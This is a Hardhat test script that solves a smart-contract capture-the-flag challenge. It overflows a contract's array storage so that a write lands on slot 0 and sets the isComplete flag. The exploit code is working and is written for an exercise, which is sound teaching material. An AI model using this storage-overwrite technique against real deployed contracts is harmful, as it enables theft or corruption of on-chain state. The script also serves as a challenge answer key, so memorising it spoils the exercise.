import { expect } from "chai";
import { BigNumber, utils } from "ethers";
import { ethers } from "hardhat";

describe("MappingChallenge", () => {
  it("Solves the challenge", async () => {
    const factory = await ethers.getContractFactory("MappingChallenge");
    const contract = await factory.deploy();
    await contract.deployed();

    const MAX_UINT_256 = BigNumber.from("2").pow("256").sub("1");

    // Expand the map to it max capacity
    const expandTx = await contract.set(MAX_UINT_256.sub("1"), 0);
    await expandTx.wait();

    // Overwrite the isComplete storage slot
    const mapLengthAddress = "0x0000000000000000000000000000000000000000000000000000000000000001";
    const mapStartSlot = BigNumber.from(utils.keccak256(mapLengthAddress));

    const NUMBER_OF_SLOTS = BigNumber.from("2").pow("256");
    const isCompletePositionInMap = NUMBER_OF_SLOTS.sub(mapStartSlot);
    const completeTx = await contract.set(isCompletePositionInMap, "1");
    await completeTx.wait();

    expect(await contract.isComplete()).to.be.true;
  });
});
